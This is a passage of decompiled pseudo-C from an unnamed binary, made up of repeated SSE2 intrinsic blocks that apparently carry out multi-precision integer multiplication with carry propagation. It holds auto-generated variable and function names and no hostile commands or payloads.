  v111 = _mm_add_epi32(v109, v109);
  v112 = _mm_add_epi32(v110, v110);
  v113 = _mm_add_epi32(_mm_add_epi32(v106, v106), _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v114 = _mm_move_epi64(v111);
  v115 = _mm_move_epi64(v112);
  v116 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v111, v114), v114), 4);
  v117 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v105, v105), _mm_loadl_epi64(&v660)), (__m128i)v116);
  v118 = (__m128i)_mm_movehl_ps(v116, v117);
  *(_DWORD *)(v119 + 40) = _mm_cvtsi128_si32((__m128i)v117);
  v120 = (__m128)_mm_add_epi32(v113, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v112, v115), v115), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v120);
  v121 = _mm_add_epi64(_mm_srli_epi64((__m128i)v117, 0x10u), (__m128i)v120);
  *(_QWORD *)(v119 + 42) = v121.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v121, 0x30u), v118).m128i_u64[0];
  v122 = _mm_load_si128(&v665);
  v123 = _mm_mul_epu32(_mm_load_si128(&v663), v122);
  v124 = _mm_load_si128(&stru_4BACE0);
  v125 = _mm_and_si128(v124, v123);
  v126 = _mm_srli_epi32(v123, 0x10u);
  v128 = _mm_mul_epu32(v122, *(__m128i *)(v127 - 16));
  sub_44B7D0();
  v129 = _mm_load_si128(&v664);
  v130 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v664.m128i_i8[8]), v129);
  v131 = _mm_mul_epu32(v129, v129);
  v132 = _mm_load_si128(&stru_4BACE0);
  v133 = _mm_add_epi32(_mm_and_si128(v124, v128), _mm_and_si128(v132, v130));
  v134 = _mm_add_epi32(_mm_srli_epi32(v128, 0x10u), _mm_srli_epi32(v130, 0x10u));
  v135 = _mm_add_epi32(v133, v133);
  v136 = _mm_add_epi32(v134, v134);
  v137 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v126, v126), _mm_srli_epi32(v131, 0x10u)),
           _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v138 = _mm_move_epi64(v135);
  v139 = _mm_move_epi64(v136);
  v140 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v135, v138), v138), 4);
  v141 = (__m128)_mm_add_epi32(
                   _mm_add_epi32(
                     _mm_add_epi32(_mm_add_epi32(v125, v125), _mm_and_si128(v132, v131)),
                     _mm_loadl_epi64(&v660)),
                   (__m128i)v140);
  v142 = (__m128i)_mm_movehl_ps(v140, v141);
  *(_DWORD *)(v143 + 48) = _mm_cvtsi128_si32((__m128i)v141);
  v144 = (__m128)_mm_add_epi32(v137, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v136, v139), v139), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v144);
  v145 = _mm_add_epi64(_mm_srli_epi64((__m128i)v141, 0x10u), (__m128i)v144);
  *(_QWORD *)(v143 + 50) = v145.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v145, 0x30u), v142).m128i_u64[0];
  v146 = _mm_load_si128(&v665);
  v147 = _mm_mul_epu32(_mm_load_si128(&v664), v146);
  v148 = _mm_load_si128(&stru_4BACE0);
  v149 = _mm_and_si128(v148, v147);
  v150 = _mm_srli_epi32(v147, 0x10u);
  v152 = _mm_mul_epu32(v146, *v151);
  v153 = _mm_and_si128(v148, v152);
  v154 = _mm_srli_epi32(v152, 0x10u);
  sub_44B793();
  v155 = _mm_add_epi32(v153, v153);
  v156 = _mm_add_epi32(v154, v154);
  v157 = _mm_add_epi32(_mm_add_epi32(v150, v150), _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v158 = _mm_move_epi64(v155);
  v159 = _mm_move_epi64(v156);
  v160 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v155, v158), v158), 4);
  v161 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v149, v149), _mm_loadl_epi64(&v660)), (__m128i)v160);
  v162 = (__m128i)_mm_movehl_ps(v160, v161);
  *(_DWORD *)(v163 + 56) = _mm_cvtsi128_si32((__m128i)v161);
  v164 = (__m128)_mm_add_epi32(v157, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v156, v159), v159), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v164);
  v165 = _mm_add_epi64(_mm_srli_epi64((__m128i)v161, 0x10u), (__m128i)v164);
  *(_QWORD *)(v163 + 58) = v165.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v165, 0x30u), v162).m128i_u64[0];
  v166 = _mm_load_si128(&v666);
  v167 = _mm_mul_epu32(_mm_load_si128(&v664), v166);
  v168 = _mm_load_si128(&stru_4BACE0);
  v169 = _mm_and_si128(v168, v167);
  v170 = _mm_srli_epi32(v167, 0x10u);
  v172 = _mm_mul_epu32(v166, *(__m128i *)(v171 - 16));
  sub_44B793();
  v173 = _mm_load_si128(&v665);
  v174 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v665.m128i_i8[8]), v173);
  v175 = _mm_mul_epu32(v173, v173);
  v176 = _mm_load_si128(&stru_4BACE0);
  v177 = _mm_add_epi32(_mm_and_si128(v168, v172), _mm_and_si128(v176, v174));
  v178 = _mm_add_epi32(_mm_srli_epi32(v172, 0x10u), _mm_srli_epi32(v174, 0x10u));
  v179 = _mm_add_epi32(v177, v177);
  v180 = _mm_add_epi32(v178, v178);
  v181 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v170, v170), _mm_srli_epi32(v175, 0x10u)),
           _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v182 = _mm_move_epi64(v179);
  v183 = _mm_move_epi64(v180);
  v184 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v179, v182), v182), 4);
  v185 = (__m128)_mm_add_epi32(
                   _mm_add_epi32(
                     _mm_add_epi32(_mm_add_epi32(v169, v169), _mm_and_si128(v176, v175)),
                     _mm_loadl_epi64(&v660)),
                   (__m128i)v184);
  v186 = (__m128i)_mm_movehl_ps(v184, v185);
  *(_DWORD *)(v187 + 64) = _mm_cvtsi128_si32((__m128i)v185);
  v188 = (__m128)_mm_add_epi32(v181, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v180, v183), v183), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v188);
  v189 = _mm_add_epi64(_mm_srli_epi64((__m128i)v185, 0x10u), (__m128i)v188);
  *(_QWORD *)(v187 + 66) = v189.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v189, 0x30u), v186).m128i_u64[0];
  v190 = _mm_load_si128(&v666);
  v191 = _mm_mul_epu32(_mm_load_si128(&v665), v190);
  v192 = _mm_load_si128(&stru_4BACE0);
  v193 = _mm_and_si128(v192, v191);
  v194 = _mm_srli_epi32(v191, 0x10u);
  v196 = _mm_mul_epu32(v190, *v195);
  v197 = _mm_and_si128(v192, v196);
  v198 = _mm_srli_epi32(v196, 0x10u);
  sub_44B756();
  v199 = _mm_add_epi32(v197, v197);
  v200 = _mm_add_epi32(v198, v198);
  v201 = _mm_add_epi32(_mm_add_epi32(v194, v194), _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v202 = _mm_move_epi64(v199);
  v203 = _mm_move_epi64(v200);
  v204 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v199, v202), v202), 4);
  v205 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v193, v193), _mm_loadl_epi64(&v660)), (__m128i)v204);
  v206 = (__m128i)_mm_movehl_ps(v204, v205);
  *(_DWORD *)(v207 + 72) = _mm_cvtsi128_si32((__m128i)v205);
  v208 = (__m128)_mm_add_epi32(v201, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v200, v203), v203), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v208);
  v209 = _mm_add_epi64(_mm_srli_epi64((__m128i)v205, 0x10u), (__m128i)v208);
  *(_QWORD *)(v207 + 74) = v209.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v209, 0x30u), v206).m128i_u64[0];
  v210 = _mm_load_si128(&v667);
  v211 = _mm_mul_epu32(_mm_load_si128(&v665), v210);
  v212 = _mm_load_si128(&stru_4BACE0);
  v213 = _mm_and_si128(v212, v211);
  v214 = _mm_srli_epi32(v211, 0x10u);
  v216 = _mm_mul_epu32(v210, *(__m128i *)(v215 - 16));
  sub_44B756();
  v217 = _mm_load_si128(&v666);
  v218 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v666.m128i_i8[8]), v217);
  v219 = _mm_mul_epu32(v217, v217);
  v220 = _mm_load_si128(&stru_4BACE0);
  v221 = _mm_add_epi32(_mm_and_si128(v212, v216), _mm_and_si128(v220, v218));
  v222 = _mm_add_epi32(_mm_srli_epi32(v216, 0x10u), _mm_srli_epi32(v218, 0x10u));
  v223 = _mm_add_epi32(v221, v221);
  v224 = _mm_add_epi32(v222, v222);
  v225 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v214, v214), _mm_srli_epi32(v219, 0x10u)),
           _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v226 = _mm_move_epi64(v223);
  v227 = _mm_move_epi64(v224);
  v228 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v223, v226), v226), 4);
  v229 = (__m128)_mm_add_epi32(
                   _mm_add_epi32(
                     _mm_add_epi32(_mm_add_epi32(v213, v213), _mm_and_si128(v220, v219)),
                     _mm_loadl_epi64(&v660)),
                   (__m128i)v228);
  v230 = (__m128i)_mm_movehl_ps(v228, v229);
  *(_DWORD *)(v231 + 80) = _mm_cvtsi128_si32((__m128i)v229);
  v232 = (__m128)_mm_add_epi32(v225, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v224, v227), v227), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v232);
  v233 = _mm_add_epi64(_mm_srli_epi64((__m128i)v229, 0x10u), (__m128i)v232);
  *(_QWORD *)(v231 + 82) = v233.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v233, 0x30u), v230).m128i_u64[0];
  v234 = _mm_load_si128(&v667);
  v235 = _mm_mul_epu32(_mm_load_si128(&v666), v234);
  v236 = _mm_load_si128(&stru_4BACE0);
  v237 = _mm_and_si128(v236, v235);
  v238 = _mm_srli_epi32(v235, 0x10u);
  v240 = _mm_mul_epu32(v234, *v239);
  v241 = _mm_and_si128(v236, v240);
  v242 = _mm_srli_epi32(v240, 0x10u);
  sub_44B719();
  v243 = _mm_add_epi32(v241, v241);
  v244 = _mm_add_epi32(v242, v242);
  v245 = _mm_add_epi32(_mm_add_epi32(v238, v238), _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v246 = _mm_move_epi64(v243);
  v247 = _mm_move_epi64(v244);
  v248 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v243, v246), v246), 4);
  v249 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v237, v237), _mm_loadl_epi64(&v660)), (__m128i)v248);
  v250 = (__m128i)_mm_movehl_ps(v248, v249);
  *(_DWORD *)(v251 + 88) = _mm_cvtsi128_si32((__m128i)v249);
  v252 = (__m128)_mm_add_epi32(v245, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v244, v247), v247), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v252);
  v253 = _mm_add_epi64(_mm_srli_epi64((__m128i)v249, 0x10u), (__m128i)v252);
  *(_QWORD *)(v251 + 90) = v253.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v253, 0x30u), v250).m128i_u64[0];
  v254 = _mm_load_si128(&v668);
  v255 = _mm_mul_epu32(_mm_load_si128(&v666), v254);
  v256 = _mm_load_si128(&stru_4BACE0);
  v257 = _mm_and_si128(v256, v255);
  v258 = _mm_srli_epi32(v255, 0x10u);
  v260 = _mm_mul_epu32(v254, *(__m128i *)(v259 - 16));
  sub_44B719();
  v261 = _mm_load_si128(&v667);
  v262 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v667.m128i_i8[8]), v261);
  v263 = _mm_mul_epu32(v261, v261);
  v264 = _mm_load_si128(&stru_4BACE0);
  v265 = _mm_add_epi32(_mm_and_si128(v256, v260), _mm_and_si128(v264, v262));
  v266 = _mm_add_epi32(_mm_srli_epi32(v260, 0x10u), _mm_srli_epi32(v262, 0x10u));
  v267 = _mm_add_epi32(v265, v265);
  v268 = _mm_add_epi32(v266, v266);
  v269 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v258, v258), _mm_srli_epi32(v263, 0x10u)),
           _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v270 = _mm_move_epi64(v267);
  v271 = _mm_move_epi64(v268);
  v272 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v267, v270), v270), 4);
  v273 = (__m128)_mm_add_epi32(
                   _mm_add_epi32(
                     _mm_add_epi32(_mm_add_epi32(v257, v257), _mm_and_si128(v264, v263)),
                     _mm_loadl_epi64(&v660)),
                   (__m128i)v272);
  v274 = (__m128i)_mm_movehl_ps(v272, v273);
  *(_DWORD *)(v275 + 96) = _mm_cvtsi128_si32((__m128i)v273);
  v276 = (__m128)_mm_add_epi32(v269, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v268, v271), v271), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v276);
  v277 = _mm_add_epi64(_mm_srli_epi64((__m128i)v273, 0x10u), (__m128i)v276);
  *(_QWORD *)(v275 + 98) = v277.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v277, 0x30u), v274).m128i_u64[0];
  v278 = _mm_load_si128(&v668);
  v279 = _mm_mul_epu32(_mm_load_si128(&v667), v278);
  v280 = _mm_load_si128(&stru_4BACE0);
  v281 = _mm_and_si128(v280, v279);
  v282 = _mm_srli_epi32(v279, 0x10u);
  v284 = _mm_mul_epu32(v278, *v283);
  v285 = _mm_and_si128(v280, v284);
  v286 = _mm_srli_epi32(v284, 0x10u);
  sub_44B6DC();
  v287 = _mm_add_epi32(v285, v285);
  v288 = _mm_add_epi32(v286, v286);
  v289 = _mm_add_epi32(_mm_add_epi32(v282, v282), _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v290 = _mm_move_epi64(v287);
  v291 = _mm_move_epi64(v288);
  v292 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v287, v290), v290), 4);
  v293 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v281, v281), _mm_loadl_epi64(&v660)), (__m128i)v292);
  v294 = (__m128i)_mm_movehl_ps(v292, v293);
  *(_DWORD *)(v295 + 104) = _mm_cvtsi128_si32((__m128i)v293);
  v296 = (__m128)_mm_add_epi32(v289, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v288, v291), v291), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v296);
  v297 = _mm_add_epi64(_mm_srli_epi64((__m128i)v293, 0x10u), (__m128i)v296);
  *(_QWORD *)(v295 + 106) = v297.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v297, 0x30u), v294).m128i_u64[0];
  v298 = _mm_load_si128(&v669);
  v299 = _mm_mul_epu32(_mm_load_si128(&v667), v298);
  v300 = _mm_load_si128(&stru_4BACE0);
  v301 = _mm_and_si128(v300, v299);
  v302 = _mm_srli_epi32(v299, 0x10u);
  v304 = _mm_mul_epu32(v298, *(__m128i *)(v303 - 16));
  sub_44B6DC();
  v305 = _mm_load_si128(&v668);
  v306 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v668.m128i_i8[8]), v305);
  v307 = _mm_mul_epu32(v305, v305);
  v308 = _mm_load_si128(&stru_4BACE0);
  v309 = _mm_add_epi32(_mm_and_si128(v300, v304), _mm_and_si128(v308, v306));
  v310 = _mm_add_epi32(_mm_srli_epi32(v304, 0x10u), _mm_srli_epi32(v306, 0x10u));
  v311 = _mm_add_epi32(v309, v309);
  v312 = _mm_add_epi32(v310, v310);
  v313 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v302, v302), _mm_srli_epi32(v307, 0x10u)),
           _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v314 = _mm_move_epi64(v311);
  v315 = _mm_move_epi64(v312);
  v316 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v311, v314), v314), 4);
  v317 = (__m128)_mm_add_epi32(
                   _mm_add_epi32(
                     _mm_add_epi32(_mm_add_epi32(v301, v301), _mm_and_si128(v308, v307)),
                     _mm_loadl_epi64(&v660)),
                   (__m128i)v316);
  v318 = (__m128i)_mm_movehl_ps(v316, v317);
  *(_DWORD *)(v319 + 112) = _mm_cvtsi128_si32((__m128i)v317);
  v320 = (__m128)_mm_add_epi32(v313, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v312, v315), v315), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v320);
  v321 = _mm_add_epi64(_mm_srli_epi64((__m128i)v317, 0x10u), (__m128i)v320);
  *(_QWORD *)(v319 + 114) = v321.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v321, 0x30u), v318).m128i_u64[0];
  v322 = _mm_load_si128(&v669);
  v323 = _mm_mul_epu32(_mm_load_si128(&v668), v322);
  v324 = _mm_load_si128(&stru_4BACE0);
  v325 = _mm_and_si128(v324, v323);
  v326 = _mm_srli_epi32(v323, 0x10u);
  v328 = _mm_mul_epu32(v322, *v327);
  v329 = _mm_and_si128(v324, v328);
  v330 = _mm_srli_epi32(v328, 0x10u);
  sub_44B69C();
  v331 = _mm_add_epi32(v329, v329);
  v332 = _mm_add_epi32(v330, v330);
  v333 = _mm_add_epi32(_mm_add_epi32(v326, v326), _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v334 = _mm_move_epi64(v331);
  v335 = _mm_move_epi64(v332);
  v336 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v331, v334), v334), 4);
  v337 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v325, v325), _mm_loadl_epi64(&v660)), (__m128i)v336);
  v338 = (__m128i)_mm_movehl_ps(v336, v337);
  *(_DWORD *)(v339 + 120) = _mm_cvtsi128_si32((__m128i)v337);
  v340 = (__m128)_mm_add_epi32(v333, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v332, v335), v335), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v340);
  v341 = _mm_add_epi64(_mm_srli_epi64((__m128i)v337, 0x10u), (__m128i)v340);
  *(_QWORD *)(v339 + 122) = v341.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v341, 0x30u), v338).m128i_u64[0];
  v342 = _mm_load_si128(&v670);
  v343 = _mm_mul_epu32(_mm_load_si128(&v668), v342);
  v344 = _mm_load_si128(&stru_4BACE0);
  v345 = _mm_and_si128(v344, v343);
  v346 = _mm_srli_epi32(v343, 0x10u);
  v348 = _mm_mul_epu32(v342, *(__m128i *)(v347 - 16));
  sub_44B6DC();
  v349 = _mm_load_si128(&v669);
  v350 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v669.m128i_i8[8]), v349);
  v351 = _mm_mul_epu32(v349, v349);
  v352 = _mm_load_si128(&stru_4BACE0);
  v353 = _mm_add_epi32(_mm_and_si128(v344, v348), _mm_and_si128(v352, v350));
  v354 = _mm_add_epi32(_mm_srli_epi32(v348, 0x10u), _mm_srli_epi32(v350, 0x10u));
  v355 = _mm_add_epi32(v353, v353);
  v356 = _mm_add_epi32(v354, v354);
  v357 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v346, v346), _mm_srli_epi32(v351, 0x10u)),
           _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v358 = _mm_move_epi64(v355);
  v359 = _mm_move_epi64(v356);
  v360 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v355, v358), v358), 4);
  v361 = (__m128)_mm_add_epi32(
                   _mm_add_epi32(
                     _mm_add_epi32(_mm_add_epi32(v345, v345), _mm_and_si128(v352, v351)),
                     _mm_loadl_epi64(&v660)),
                   (__m128i)v360);
  v362 = (__m128i)_mm_movehl_ps(v360, v361);
  *(_DWORD *)(v363 + 128) = _mm_cvtsi128_si32((__m128i)v361);
  v364 = (__m128)_mm_add_epi32(v357, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v356, v359), v359), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v364);
  v365 = _mm_add_epi64(_mm_srli_epi64((__m128i)v361, 0x10u), (__m128i)v364);
  *(_QWORD *)(v363 + 130) = v365.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v365, 0x30u), v362).m128i_u64[0];
  v366 = _mm_load_si128(&v670);
  v367 = _mm_mul_epu32(_mm_load_si128(&v669), v366);
  v368 = _mm_load_si128(&stru_4BACE0);
  v369 = _mm_and_si128(v368, v367);
  v370 = _mm_srli_epi32(v367, 0x10u);
  v372 = _mm_mul_epu32(v366, *v371);
  v373 = _mm_and_si128(v368, v372);
  v374 = _mm_srli_epi32(v372, 0x10u);
  sub_44B6DC();
  v375 = _mm_add_epi32(v373, v373);
  v376 = _mm_add_epi32(v374, v374);
  v377 = _mm_add_epi32(_mm_add_epi32(v370, v370), _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v378 = _mm_move_epi64(v375);
  v379 = _mm_move_epi64(v376);
  v380 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v375, v378), v378), 4);
  v381 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v369, v369), _mm_loadl_epi64(&v660)), (__m128i)v380);
  v382 = (__m128i)_mm_movehl_ps(v380, v381);
  *(_DWORD *)(v383 + 136) = _mm_cvtsi128_si32((__m128i)v381);
  v384 = (__m128)_mm_add_epi32(v377, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v376, v379), v379), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v384);
  v385 = _mm_add_epi64(_mm_srli_epi64((__m128i)v381, 0x10u), (__m128i)v384);
  *(_QWORD *)(v383 + 138) = v385.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v385, 0x30u), v382).m128i_u64[0];
  v386 = _mm_load_si128(&v671);
  v387 = _mm_mul_epu32(_mm_load_si128(&v669), v386);
  v388 = _mm_load_si128(&stru_4BACE0);
  v389 = _mm_and_si128(v388, v387);
  v390 = _mm_srli_epi32(v387, 0x10u);
  v392 = _mm_mul_epu32(v386, *(__m128i *)(v391 - 16));
  sub_44B719();
  v393 = _mm_load_si128(&v670);
  v394 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v670.m128i_i8[8]), v393);
  v395 = _mm_mul_epu32(v393, v393);
  v396 = _mm_load_si128(&stru_4BACE0);
  v397 = _mm_add_epi32(_mm_and_si128(v388, v392), _mm_and_si128(v396, v394));
  v398 = _mm_add_epi32(_mm_srli_epi32(v392, 0x10u), _mm_srli_epi32(v394, 0x10u));
  v399 = _mm_add_epi32(v397, v397);
  v400 = _mm_add_epi32(v398, v398);
  v401 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v390, v390), _mm_srli_epi32(v395, 0x10u)),
           _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v402 = _mm_move_epi64(v399);
  v403 = _mm_move_epi64(v400);
  v404 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v399, v402), v402), 4);
  v405 = (__m128)_mm_add_epi32(
                   _mm_add_epi32(
                     _mm_add_epi32(_mm_add_epi32(v389, v389), _mm_and_si128(v396, v395)),
                     _mm_loadl_epi64(&v660)),
                   (__m128i)v404);
  v406 = (__m128i)_mm_movehl_ps(v404, v405);
  *(_DWORD *)(v407 + 144) = _mm_cvtsi128_si32((__m128i)v405);
  v408 = (__m128)_mm_add_epi32(v401, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v400, v403), v403), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v408);
  v409 = _mm_add_epi64(_mm_srli_epi64((__m128i)v405, 0x10u), (__m128i)v408);
  *(_QWORD *)(v407 + 146) = v409.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v409, 0x30u), v406).m128i_u64[0];
  v410 = _mm_load_si128(&v671);
  v411 = _mm_mul_epu32(_mm_load_si128(&v670), v410);
  v412 = _mm_load_si128(&stru_4BACE0);
  v413 = _mm_and_si128(v412, v411);
  v414 = _mm_srli_epi32(v411, 0x10u);
  v416 = _mm_mul_epu32(v410, *v415);
  v417 = _mm_and_si128(v412, v416);
  v418 = _mm_srli_epi32(v416, 0x10u);
  sub_44B719();
  v419 = _mm_add_epi32(v417, v417);
  v420 = _mm_add_epi32(v418, v418);
  v421 = _mm_add_epi32(_mm_add_epi32(v414, v414), _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v422 = _mm_move_epi64(v419);
  v423 = _mm_move_epi64(v420);
  v424 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v419, v422), v422), 4);
  v425 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v413, v413), _mm_loadl_epi64(&v660)), (__m128i)v424);
  v426 = (__m128i)_mm_movehl_ps(v424, v425);
  *(_DWORD *)(v427 + 152) = _mm_cvtsi128_si32((__m128i)v425);
  v428 = (__m128)_mm_add_epi32(v421, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v420, v423), v423), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v428);
  v429 = _mm_add_epi64(_mm_srli_epi64((__m128i)v425, 0x10u), (__m128i)v428);
  *(_QWORD *)(v427 + 154) = v429.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v429, 0x30u), v426).m128i_u64[0];
  v430 = _mm_load_si128(&v672);
  v431 = _mm_mul_epu32(_mm_load_si128(&v670), v430);
  v432 = _mm_load_si128(&stru_4BACE0);
  v433 = _mm_and_si128(v432, v431);
  v434 = _mm_srli_epi32(v431, 0x10u);
  v436 = _mm_mul_epu32(v430, *(__m128i *)(v435 - 16));
  sub_44B756();
  v437 = _mm_load_si128(&v671);
  v438 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v671.m128i_i8[8]), v437);
  v439 = _mm_mul_epu32(v437, v437);
  v440 = _mm_load_si128(&stru_4BACE0);
  v441 = _mm_add_epi32(_mm_and_si128(v432, v436), _mm_and_si128(v440, v438));
  v442 = _mm_add_epi32(_mm_srli_epi32(v436, 0x10u), _mm_srli_epi32(v438, 0x10u));
  v443 = _mm_add_epi32(v441, v441);
  v444 = _mm_add_epi32(v442, v442);
  v445 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v434, v434), _mm_srli_epi32(v439, 0x10u)),
           _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v446 = _mm_move_epi64(v443);
  v447 = _mm_move_epi64(v444);
  v448 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v443, v446), v446), 4);
  v449 = (__m128)_mm_add_epi32(
                   _mm_add_epi32(
                     _mm_add_epi32(_mm_add_epi32(v433, v433), _mm_and_si128(v440, v439)),
                     _mm_loadl_epi64(&v660)),
                   (__m128i)v448);
  v450 = (__m128i)_mm_movehl_ps(v448, v449);
  *(_DWORD *)(v451 + 160) = _mm_cvtsi128_si32((__m128i)v449);
  v452 = (__m128)_mm_add_epi32(v445, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v444, v447), v447), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v452);
  v453 = _mm_add_epi64(_mm_srli_epi64((__m128i)v449, 0x10u), (__m128i)v452);
  *(_QWORD *)(v451 + 162) = v453.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v453, 0x30u), v450).m128i_u64[0];
  v454 = _mm_load_si128(&v672);
  v455 = _mm_mul_epu32(_mm_load_si128(&v671), v454);
  v456 = _mm_load_si128(&stru_4BACE0);
  v457 = _mm_and_si128(v456, v455);
  v458 = _mm_srli_epi32(v455, 0x10u);
  v460 = _mm_mul_epu32(v454, *v459);
  v461 = _mm_and_si128(v456, v460);
  v462 = _mm_srli_epi32(v460, 0x10u);
  sub_44B756();
  v463 = _mm_add_epi32(v461, v461);
  v464 = _mm_add_epi32(v462, v462);
  v465 = _mm_add_epi32(_mm_add_epi32(v458, v458), _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v466 = _mm_move_epi64(v463);
  v467 = _mm_move_epi64(v464);
  v468 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v463, v466), v466), 4);
